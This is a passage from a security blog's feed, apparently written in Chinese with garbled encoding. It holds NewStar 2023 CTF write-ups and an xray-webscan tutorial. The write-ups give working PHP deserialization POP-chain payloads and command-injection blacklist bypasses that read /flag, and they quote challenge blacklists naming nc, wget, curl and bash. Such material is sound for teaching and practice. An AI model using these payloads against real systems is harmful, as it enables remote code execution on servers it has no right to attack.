class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Then</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Super</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;handle = <span class="variable">$a</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WhiteGod</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="keyword">var</span> = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">Begin</span>(<span class="keyword">new</span> <span class="title class_">Then</span>(<span class="keyword">new</span> <span class="title class_">Super</span>(<span class="keyword">new</span> <span class="title class_">Handle</span>(<span class="keyword">new</span> <span class="title function_ invoke__">CTF</span>(<span class="keyword">new</span> <span class="title class_">WhiteGod</span>(<span class="string">&quot;readfile&quot;</span>,<span class="string">&quot;/flag&quot;</span>))))) );</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025201417567.png" alt="image-20231025201417567"></p><h4 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!!C!!!E!!!"></a>R!!!C!!!E!!!</h4><p>é¢˜ç›®ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿæºç ï¼Œå…¸å‹çš„phpåºåˆ—åŒ–ï¼Œè§‚å¯Ÿé¢˜ç›®ï¼Œè¿™åˆæ˜¯ä¸€é“rceçš„é¢˜ç›®ï¼Œåº”è¯¥å¯ä»¥é€šè¿‡teeå‘½ä»¤-&gt;<strong>æŠŠæ‰§è¡Œçš„å‘½ä»¤å†™å…¥æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®è¿™ä¸ªæ–‡ä»¶æ¥çœ‹åˆ°å›æ˜¾å†…å®¹</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;ls / | t&#x27;&#x27;ee a&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;qwejaskdjnlka = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>O%3A7%3A%22minipop%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22ls+%2F+%7C+t%27%27ee+a%22%3Bs%3A13%3A%22qwejaskdjnlka%22%3BO%3A7%3A%22minipop%22%3A2%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22ls+%2F+%7C+t%27%27ee+a%22%3Bs%3A13%3A%22qwejaskdjnlka%22%3BN%3B%7D%7D</code>æ³¨æ„å°†+ æ¢æˆ%20</p><p>æ¥ç€è®¿é—®<code>url/a</code></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027144154458.png" alt="image-20231027144154458"></p><p>å‘ç°flagçš„è—èº«ä¹‹åœ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;cat /flag_is_h3eeere | t&#x27;&#x27;ee b&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;qwejaskdjnlka = <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®¿é—®url&#x2F;b å‡ºç°flag</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027144414800.png" alt="image-20231027144414800"></p><h4 id="GenShin"><a href="#GenShin" class="headerlink" title="GenShin"></a>GenShin</h4><p>æŠ“åŒ…å‘ç°ï¼š&#x2F;secr3tofpop</p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027145206974.png" alt="image-20231027145206974"></p><p>æ‰“å¼€å‘ç° éœ€è¦é€šè¿‡getç»™nameä¼ å‚</p><p><img src="http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231027145301252.png" alt="image-20231027145301252"></p><p>å‘ç°ç»™nameä¼ ä»€ä¹ˆï¼Œé¡µé¢å°±å›æ˜¾ä»€ä¹ˆï¼Œé¦–å…ˆå°è¯•äº†phpä¼ªåè®®è¯»å–æ–‡ä»¶ï¼Œæµ‹è¯•å¤±è´¥ï¼Œåœ¨æŸ¥è¯¢èµ„æ–™åå‘ç°ä¸<code>UNCTF2020</code>çš„easyflaské¢˜ç›®å¾ˆç›¸ä¼¼ï¼ŒçŒœæµ‹æ˜¯æ¨¡ç‰ˆæ³¨å…¥ï¼Œé¦–å…ˆå°è¯•**{{%print(7*7)%}}**,å‘ç°åº”è¯¥æ˜¯&#96;</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;week3&quot;&gt;&lt;a href=&quot;#week3&quot; class=&quot;headerlink&quot; title=&quot;week3&quot;&gt;&lt;/a&gt;week3&lt;/h2&gt;&lt;h3 id=&quot;web&quot;&gt;&lt;a href=&quot;#web&quot; class=&quot;headerlink&quot; title=&quot;web&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="CTF" scheme="https://iahzl.github.io/categories/CTF/"/>
    
    <category term="NewStar 2023" scheme="https://iahzl.github.io/categories/CTF/NewStar-2023/"/>
    
    
    <category term="ctf" scheme="https://iahzl.github.io/tags/ctf/"/>
    
    <category term="crypto" scheme="https://iahzl.github.io/tags/crypto/"/>
    
    <category term="web" scheme="https://iahzl.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>xray-webscanä½¿ç”¨æ•™ç¨‹</title>
    <link href="https://iahzl.github.io/xray-webscan%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"/>
    <id>https://iahzl.github.io/xray-webscan%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</id>
    <published>2023-10-25T08:28:59.000Z</published>
    <updated>2023-10-25T08:31:15.331Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xray-webscan"><a href="#xray-webscan" class="headerlink" title="xray-webscan"></a>xray-webscan</h1><h2 id="å¿«é€Ÿä½¿ç”¨"><a href="#å¿«é€Ÿä½¿ç”¨" class="headerlink" title="å¿«é€Ÿä½¿ç”¨"></a>å¿«é€Ÿä½¿ç”¨</h2><h3 id="æ‰«æä¸€ä¸ªç«™ç‚¹"><a href="#æ‰«æä¸€ä¸ªç«™ç‚¹" class="headerlink" title="æ‰«æä¸€ä¸ªç«™ç‚¹"></a>æ‰«æä¸€ä¸ªç«™ç‚¹</h3><p>æœ€ç®€å•çš„æ–¹å¼æ˜¯ç›´æ¥è°ƒç”¨ï¼Œæ‰«æä¸€ä¸ªæŒ‡å®šçš„ç«™ç‚¹ï¼Œå¦‚ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray webscan --basic-crawler http://example.com/</span><br></pre></td></tr></table></figure><blockquote><p>è¿™å¯èƒ½æ˜¯æœ€ç®€å•æœ€å¸¸ç”¨çš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå°±æ˜¯å¤ªé•¿äº†ï¼Œä½“éªŒä¸å¤ªå‹å¥½ï¼Œå»ºè®®å¸¸ç”¨çš„åŒå­¦å¯ä»¥ <code>alias xray=&quot;/path/xray webscan --basic-crawler&quot;</code></p></blockquote><h3 id="æŒ‡å®šæ‰«æè¾“å‡º"><a href="#æŒ‡å®šæ‰«æè¾“å‡º" class="headerlink" title="æŒ‡å®šæ‰«æè¾“å‡º"></a>æŒ‡å®šæ‰«æè¾“å‡º</h3><p>ä¸æŒ‡å®šè¾“å‡ºæ—¶ï¼Œé»˜è®¤è¾“å‡ºåˆ°æ§åˆ¶å°çš„æ ‡å‡†è¾“å‡ºä¸­ï¼Œå¯ä»¥åšç®¡é“å¤„ç†ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©è¾“å‡ºä¸ºæ–‡ä»¶ï¼Œå¦‚ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray webscan --url http://example.com/ --json-output report.json</span><br></pre></td></tr></table></figure><p>ä¸åŒå‚æ•°å¯¹åº”ä¸åŒçš„è¾“å‡ºæ–¹å¼ï¼š</p><ul><li>æ— å‚æ•°ï¼šè¾“å‡ºåˆ°æ§åˆ¶å°çš„æ ‡å‡†è¾“å‡º</li><li><code>--text-output</code>ï¼šè¾“å‡ºåˆ°æ–‡æœ¬æ–‡ä»¶ä¸­</li><li><code>--json-output</code>ï¼šè¾“å‡ºåˆ° JSON æ–‡ä»¶ä¸­</li><li><code>--html-output</code>ï¼šè¾“å‡ºåˆ° HTML æ–‡ä»¶ä¸­</li></ul><h3 id="åŸºäºä»£ç†çš„è¢«åŠ¨æ‰«æ"><a href="#åŸºäºä»£ç†çš„è¢«åŠ¨æ‰«æ" class="headerlink" title="åŸºäºä»£ç†çš„è¢«åŠ¨æ‰«æ"></a>åŸºäºä»£ç†çš„è¢«åŠ¨æ‰«æ</h3><p>xray å¯ä»¥é€šè¿‡ç±»ä¼¼ Burp çš„æ–¹å¼å¯åŠ¨ï¼Œåˆ©ç”¨ HTTP ä»£ç†æ¥æŠ“åŒ…æ‰«æï¼Œå¦‚ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray webscan --listen 127.0.0.1:7777</span><br></pre></td></tr></table></figure><p>å¦‚æœè¿è¡Œæ²¡æŠ¥ä»»ä½•é”™å°±å¯ä»¥è®¾ç½®æµè§ˆå™¨ HTTP ä»£ç†ä¸º <code>127.0.0.1:7777</code> äº†ï¼Œå…³äºå¦‚ä½•è®¾ç½®æµè§ˆå™¨ä»£ç†ï¼Œè¯·æ‰“å¼€ç™¾åº¦æœç´¢ â€œæµè§ˆå™¨è®¾ç½®ä»£ç†â€ã€‚</p><p>ä»£ç†è®¾ç½® OK ä»¥åå°±å¯ä»¥å¯åŠ¨ä»£ç†æ‰«æäº†ï¼Œè¿™æ—¶å€™æˆ‘ä»¬æ‰“æ¥æµè§ˆå™¨å°½æƒ…å†²æµªå§ï¼Œç†è®ºä¸Šæˆ‘ä»¬çš„é¼ æ ‡ç‚¹åˆ°å“ª xray å°±èƒ½æ‰«åˆ°å“ªã€‚</p><p>éœ€è¦æ³¨æ„ä¸€ä¸‹çš„æ˜¯ï¼Œå¾ˆå¤šæ—¶å€™è¿˜ä¼šæ‰«åˆ° HTTPS ç«™ç‚¹ï¼Œå¯èƒ½ä¼šå› ä¸ºæœ‰ä»£ç†è€Œå¯¼è‡´æ— æ³•è®¿é—®ï¼Œæˆ–è€…éœ€è¦æ‰‹åŠ¨ç¡®è®¤å®‰å…¨é£é™©ã€‚è¿™æ—¶å€™éœ€è¦æˆ‘ä»¬å¯¼å…¥ xray è¿è¡Œç›®å½•ä¸‹çš„ <code>ca.crt</code> è¯ä¹¦ï¼Œå…³äºå¦‚ä½•å¯¼å…¥ CA è¯ä¹¦ï¼Œè¯·æ‰“å¼€ç™¾åº¦æœç´¢ â€œå®‰è£…CAè¯ä¹¦â€ã€‚</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ   ls</span><br><span class="line">ca.crt      ca.key      config.yaml xray</span><br></pre></td></tr></table></figure><h2 id="é«˜çº§å§¿åŠ¿"><a href="#é«˜çº§å§¿åŠ¿" class="headerlink" title="é«˜çº§å§¿åŠ¿"></a>é«˜çº§å§¿åŠ¿</h2><h3 id="æŒ‡å®šæ‰«ææ’ä»¶"><a href="#æŒ‡å®šæ‰«ææ’ä»¶" class="headerlink" title="æŒ‡å®šæ‰«ææ’ä»¶"></a>æŒ‡å®šæ‰«ææ’ä»¶</h3><p>ä½¿ç”¨ <code>--plugins</code> å‚æ•°å¯ä»¥é€‰æ‹©ä»…å¯ç”¨éƒ¨åˆ†æ‰«ææ’ä»¶ï¼Œå¤šä¸ªæ’ä»¶ä¹‹é—´å¯ä½¿ç”¨é€—å·åˆ†éš”ï¼Œå¦‚ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray webscan --plugins cmd_injection --url http://example.com/</span><br></pre></td></tr></table></figure><p>ç›®å‰æä¾›çš„æ’ä»¶åˆ—è¡¨å¦‚ä¸‹ï¼š</p><ul><li>SQL æ³¨å…¥æ£€æµ‹ (key: sqldet)<br>æ”¯æŒæŠ¥é”™æ³¨å…¥ã€å¸ƒå°”æ³¨å…¥å’Œæ—¶é—´ç›²æ³¨ç­‰</li><li>XSS æ£€æµ‹ï¼ˆkey: xssï¼‰<br>æ”¯æŒæ‰«æåå°„å‹ã€å­˜å‚¨å‹ XSS</li><li>å‘½ä»¤&#x2F;ä»£ç æ³¨å…¥æ£€æµ‹ (key: cmd_injection)<br>æ”¯æŒ shell å‘½ä»¤æ³¨å…¥ã€PHP ä»£ç æ‰§è¡Œã€æ¨¡æ¿æ³¨å…¥ç­‰</li><li>ç›®å½•æšä¸¾ (key: dirscan)<br>æ£€æµ‹å¤‡ä»½æ–‡ä»¶ã€ä¸´æ—¶æ–‡ä»¶ã€debug é¡µé¢ã€é…ç½®æ–‡ä»¶ç­‰10ä½™ç±»æ•æ„Ÿè·¯å¾„å’Œæ–‡ä»¶</li><li>è·¯å¾„ç©¿è¶Šæ£€æµ‹ (key: path_traversal)<br>æ”¯æŒå¸¸è§å¹³å°å’Œç¼–ç </li><li>XML å®ä½“æ³¨å…¥æ£€æµ‹ (key: xxe)<br>æ”¯æŒæœ‰å›æ˜¾å’Œåè¿å¹³å°æ£€æµ‹</li><li>POC ç®¡ç† (key: phantasm)<br>é»˜è®¤å†…ç½®éƒ¨åˆ†å¸¸ç”¨çš„ POCï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®éœ€è¦è‡ªè¡Œæ„å»º POC å¹¶è¿è¡Œã€‚å¯å‚è€ƒï¼š<a href="https://link.zhihu.com/?target=https://chaitin.github.io/xray/%23/guide/poc">POC ç¼–å†™æ–‡æ¡£</a></li><li>æ–‡ä»¶ä¸Šä¼ æ£€æµ‹ (key: upload)<br>æ”¯æŒæ£€æµ‹å¸¸è§çš„åç«¯æœåŠ¡å™¨è¯­è¨€çš„ä¸Šä¼ æ¼æ´</li><li>å¼±å£ä»¤æ£€æµ‹ (key: brute_force)<br>æ”¯æŒæ£€æµ‹ HTTP åŸºç¡€è®¤è¯å’Œç®€æ˜“è¡¨å•å¼±å£ä»¤ï¼Œå†…ç½®å¸¸è§ç”¨æˆ·åå’Œå¯†ç å­—å…¸</li><li>JSONP æ£€æµ‹ (key: jsonp)<br>æ£€æµ‹åŒ…å«æ•æ„Ÿä¿¡æ¯å¯ä»¥è¢«è·¨åŸŸè¯»å–çš„ jsonp æ¥å£</li><li>SSRF æ£€æµ‹ (key: ssrf)<br>ssrf æ£€æµ‹æ¨¡å—ï¼Œæ”¯æŒå¸¸è§çš„ç»•è¿‡æŠ€æœ¯å’Œåè¿å¹³å°æ£€æµ‹</li><li>åŸºçº¿æ£€æŸ¥ (key: baseline)<br>æ£€æµ‹ä½ SSL ç‰ˆæœ¬ã€ç¼ºå¤±çš„æˆ–é”™è¯¯æ·»åŠ çš„ http å¤´ç­‰</li><li>ä»»æ„è·³è½¬æ£€æµ‹ (key: redirect)<br>æ”¯æŒ HTML meta è·³è½¬ã€30x è·³è½¬ç­‰</li><li>CRLF æ³¨å…¥ (key: crlf_injection)<br>æ£€æµ‹ HTTP å¤´æ³¨å…¥ï¼Œæ”¯æŒ queryã€body ç­‰ä½ç½®çš„å‚æ•°</li><li>â€¦</li></ul><h3 id="åªæ‰«æä¸€ä¸ª-URL"><a href="#åªæ‰«æä¸€ä¸ª-URL" class="headerlink" title="åªæ‰«æä¸€ä¸ª URL"></a>åªæ‰«æä¸€ä¸ª URL</h3><p>xray è¿˜æä¾›äº†æ–¹ä¾¿çš„åªæ‰«æä¸€ä¸ª URL çš„æ–¹å¼ï¼Œå¦‚ï¼š</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray webscan --url http://example.com/ --json-output out.json</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xray-webscan&quot;&gt;&lt;a href=&quot;#xray-webscan&quot; class=&quot;headerlink&quot; title=&quot;xray-webscan&quot;&gt;&lt;/a&gt;xray-webscan&lt;/h1&gt;&lt;h2 id=&quot;å¿«é€Ÿä½¿ç”¨&quot;&gt;&lt;a href=&quot;#å¿«é€Ÿä½¿ç”¨&quot; cla</summary>
      
    
    
    
    <category term="åˆ©å…¶å™¨" scheme="https://iahzl.github.io/categories/%E5%88%A9%E5%85%B6%E5%99%A8/"/>
    
    
    <category term="å·¥å…·" scheme="https://iahzl.github.io/tags/%E5%B7%A5%E5%85%B7/"/>
    
    <category term="xray" scheme="https://iahzl.github.io/tags/xray/"/>
    
  </entry>
  
  <entry>
    <title>NewStar 2023 Week2</title>
    <link href="https://iahzl.github.io/NewStar-WriteUp-Week2/"/>
    <id>https://iahzl.github.io/NewStar-WriteUp-Week2/</id>
    <published>2023-10-16T07:29:17.000Z</published>
    <updated>2023-10-25T08:27:05.878Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NewStar-2023-Week2"><a href="#NewStar-2023-Week2" class="headerlink" title="NewStar 2023 Week2"></a>NewStar 2023 Week2</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="æ¸¸æˆé«˜æ‰‹"><a href="#æ¸¸æˆé«˜æ‰‹" class="headerlink" title="æ¸¸æˆé«˜æ‰‹"></a>æ¸¸æˆé«˜æ‰‹</h3><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095418077.png" alt="image-20231009095418077"></p><ol><li>æ‰“å¼€é¢˜ç›®çœ‹åˆ°ä¸Šè¿°ï¼Œæ˜¾ç„¶ä¸å¯èƒ½ç©åˆ°100000åˆ†ï¼Œé¦–å…ˆbpæŠ“åŒ…çœ‹çœ‹æœ‰ä»€ä¹ˆå‘ç°</li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095513886.png" alt="image-20231009095513886"></p><ol start="2"><li>ä¼¼ä¹æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå¥½åƒæœ‰æœ‰ç”¨ä¿¡æ¯<code>app_v2.js</code> jsæ–‡ä»¶</li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095623116.png" alt="image-20231009095623116"></p><ol start="3"><li>æŸ¥çœ‹jsæ–‡ä»¶äºæ˜¯æœ‰äº†æƒ³æ³•ï¼šæ˜¯å¦å¯ä»¥ç›´æ¥ä¿®æ”¹åŸå§‹çš„åˆ†æ•°</li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095742045.png" alt="image-20231009095742045"></p><ol start="4"><li>è°ƒè¯•å™¨ï¼Œåœ¨20è¡Œè®¾ç½®æ–­ç‚¹ï¼ŒF5åˆ·æ–°åï¼Œåœ¨æ§åˆ¶å°è¾“å…¥ï¼š<code>gameScore = 100000</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095940757.png" alt="image-20231009095940757"></p><ol start="5"><li>æ¥ç€è¿”å›è°ƒè¯•å™¨ï¼Œå¯ä»¥çœ‹åˆ°æ­¤æ—¶çš„<code>gameScore</code>çš„å€¼ä¸º100000</li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009100051189.png" alt="image-20231009100051189"></p><ol start="6"><li>æ¥ç€F8,è®©jsä»£ç é¡ºåˆ©æ‰§è¡Œï¼Œè¿›å…¥æ¸¸æˆä¼šå‘ç°åŸå§‹åˆ†å˜æˆäº†100000ï¼Œç»“æŸæ¸¸æˆå³å¯å¾—åˆ°flag</li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009100224984.png" alt="image-20231009100224984"></p><h3 id="include-0ã€‚0"><a href="#include-0ã€‚0" class="headerlink" title="include 0ã€‚0"></a>include 0ã€‚0</h3><ol><li>æ‰“å¼€å°±çœ‹åˆ°æºç </li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|tac|more|tail|base/i&quot;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;unser&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><ol start="2"><li>å‘ç°è¿‡æ»¤äº†<code>base</code>å’Œ<code>rot</code> 